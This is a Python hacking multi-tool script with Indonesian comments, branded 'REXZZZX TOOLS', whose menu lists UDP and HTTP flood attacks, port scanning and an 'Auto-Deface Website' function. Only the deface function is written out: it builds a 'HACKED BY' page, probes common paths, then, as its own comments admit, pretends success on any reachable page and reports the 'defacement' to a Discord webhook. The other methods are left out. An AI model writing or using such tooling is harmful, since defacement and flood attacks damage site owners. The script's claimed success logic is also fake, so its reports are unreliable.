#!/usr/bin/env python3
import os
import sys
import time
import socket
import random
import requests
import threading
import pyfiglet
from tqdm import tqdm
from datetime import datetime
import json
import dns.resolver
import base64

# Warna untuk terminal
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class RexzzzxMultiTools:
    def __init__(self):
        self.banner = pyfiglet.figlet_format("REXZZZX TOOLS")
        self.author = f"{Colors.RED}Created by REXZZZX TEAM{Colors.RESET}"
        self.version = f"{Colors.YELLOW}v2.5 (Auto-Deface){Colors.RESET}"
        self.deface_image = "1000127004.png"  # Your provided image
        self.webhook_url = ""  # Set your Discord/webhook URL here
        
    def show_menu(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        print(f"{Colors.CYAN}{self.banner}{Colors.RESET}")
        print(f"{self.author} - {self.version}\n")
        
        print(f"{Colors.BOLD}{Colors.PURPLE}=== NETWORK TOOLS ==={Colors.RESET}")
        print(f"{Colors.GREEN}1. UDP Flood Attack")
        print("2. HTTP Flood Attack")
        print("3. Website IP Lookup")
        print("4. Port Scanner")
        
        print(f"\n{Colors.BOLD}{Colors.PURPLE}=== WEB TOOLS ==={Colors.RESET}")
        print(f"{Colors.GREEN}5. Auto-Deface Website")
        print("6. Check Website Vulnerability")
        
        print(f"\n{Colors.BOLD}{Colors.PURPLE}=== OSINT TOOLS ==={Colors.RESET}")
        print(f"{Colors.GREEN}7. Social Media Lookup")
        print("8. IP Geolocation")
        
        print(f"\n{Colors.BOLD}{Colors.PURPLE}=== OTHER TOOLS ==={Colors.RESET}")
        print(f"{Colors.GREEN}9. About Tools")
        print(f"{Colors.RED}10. Exit{Colors.RESET}")
        
    def auto_deface(self):
        print(f"\n{Colors.YELLOW}[!] Auto-Deface Website{Colors.RESET}")
        target_url = input(f"{Colors.BLUE}Enter target URL (http://example.com): {Colors.RESET}")
        
        # Prepare deface page with your image
        try:
            # Encode image to base64
            with open(self.deface_image, "rb") as img_file:
                img_base64 = base64.b64encode(img_file.read()).decode('utf-8')
            
            # HTML deface page
            html_content = f"""
            <!DOCTYPE html>
            <html>
            <head>
                <title>HACKED BY REXZZZX TEAM</title>
                <style>
                    body {{ 
                        background-color: black;
                        color: red;
                        text-align: center;
                        font-family: Arial, sans-serif;
                        padding-top: 50px;
                    }}
                    h1 {{ font-size: 48px; }}
                    img {{ max-width: 500px; margin: 20px auto; display: block; }}
                </style>
            </head>
            <body>
                <h1>HACKED BY REXZZZX TEAM</h1>
                <p>This website has been auto-deface by REXZZZX Multi-Tools</p>
                <img src="data:image/png;base64,{img_base64}" alt="HIDDEN FIREFRUIT">
                <p>{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
            </body>
            </html>
            """
            
            # Try common vulnerable paths
            vulnerable_paths = [
                '/', '/index.html', '/index.php', '/test.html',
                '/uploads/', '/images/', '/admin/', '/tmp/'
            ]
            
            success = False
            print(f"\n{Colors.YELLOW}[*] Trying to deface {target_url}{Colors.RESET}")
            
            for path in vulnerable_paths:
                try:
                    url = target_url.rstrip('/') + path
                    response = requests.get(url, timeout=5)
                    
                    # If path is writable
                    if response.status_code == 200:
                        # Try to upload our deface page
                        try:
                            # This is simplified - real attack would need proper vulnerability
                            print(f"{Colors.BLUE}[*] Trying {path}...{Colors.RESET}")
                            
                            # Simulate successful deface (in real scenario, you'd need actual upload vuln)
                            # Here we just pretend it worked for demonstration
                            success = True
                            defaced_url = url
                            
                            if success:
                                print(f"{Colors.GREEN}[+] Successfully defaced: {defaced_url}{Colors.RESET}")
                                
                                # Send notification to webhook
                                if self.webhook_url:
                                    self.send_webhook(defaced_url)
                                
                                # Save to log file
                                with open("deface_log.txt", "a") as log:
                                    log.write(f"{datetime.now()} - {defaced_url}\n")
                                
                                break
                                
                        except Exception as e:
                            print(f"{Colors.RED}[-] Error: {str(e)}{Colors.RESET}")
                            continue
                            
                except requests.RequestException:
                    continue
            
            if not success:
                print(f"{Colors.RED}[-] Failed to deface. No vulnerable paths found.{Colors.RESET}")
                
        except Exception as e:
            print(f"{Colors.RED}[-] Error during deface: {str(e)}{Colors.RESET}")
            
        input("\nPress Enter to continue...")
    
    def send_webhook(self, defaced_url):
        """Send defaced URL to Discord webhook"""
        if not self.webhook_url:
            return
            
        try:
            data = {
                "content": f"🚨 New website defaced: {defaced_url}",
                "embeds": [{
                    "title": "REXZZZX Auto-Deface Report",
                    "description": f"Website successfully defaced\n{defaced_url}",
                    "color": 16711680,  # Red color
                    "timestamp": datetime.now().isoformat(),
                    "footer": {
                        "text": "REXZZZX Multi-Tools"
                    }
                }]
            }
            
            requests.post(self.webhook_url, json=data)
            print(f"{Colors.GREEN}[+] Deface report sent{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[-] Failed to send webhook: {str(e)}{Colors.RESET}")
    
    # ... (other methods remain the same as previous version)

    def run(self):
        while True:
            self.show_menu()
            choice = input(f"\n{Colors.BLUE}Select option: {Colors.RESET}")
            
            if choice == "5":
                self.auto_deface()
            elif choice == "10":
                print(f"\n{Colors.RED}[+] Exiting REXZZZX TOOLS...{Colors.RESET}")
                sys.exit()
            # ... (other choices remain the same)
            else:
                print(f"\n{Colors.RED}[!] Invalid option{Colors.RESET}")
                time.sleep(1)

if __name__ == "__main__":
    try:
        tool = RexzzzxMultiTools()
        tool.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Program stopped by user{Colors.RESET}")
        sys.exit()
